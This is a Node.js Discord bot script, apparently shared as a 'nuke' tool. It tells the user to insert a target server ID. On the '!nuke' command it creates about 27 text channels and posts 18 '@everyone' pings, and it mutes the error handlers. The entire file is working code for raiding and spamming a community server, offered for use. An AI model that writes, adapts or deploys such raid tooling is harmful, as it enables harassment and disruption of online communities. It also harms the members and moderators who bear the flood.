// sefty#001
// MAKE SURE TO CHANGE "CHANNEL_NAME" AND "YOUR MESSAGE"
// CHANGE "SERVER_TO_NUKE_ID" TO SERVER ID

const Discord = require("discord.js")

const { TOKEN } = require("./config.js")

const client = new Discord.Client()

client.on("ready", () => {
    console.log("Bot is online")
})

client.on("message", async message => {
    const msg = message.content.toLowerCase()
    const args = message.content.trim().split(/ +/g);
    const guild = client.guilds.cache.get("SERVER_TO_NUKE_ID");

    if (msg == "!nuke") {

        const channelName = "YOUR MESSAGE"
        const messageToSend = "YOUR MESSAGE"
        
        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await guild.channels
            .create(channelName, {
                type: "text",
            })

        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
        await message.channel.send(`@everyone ${messageToSend}`)
    }
})

client.login(TOKEN)

client.on("debug", () => { })
client.on("warn", () => { })
client.on("error", () => { })
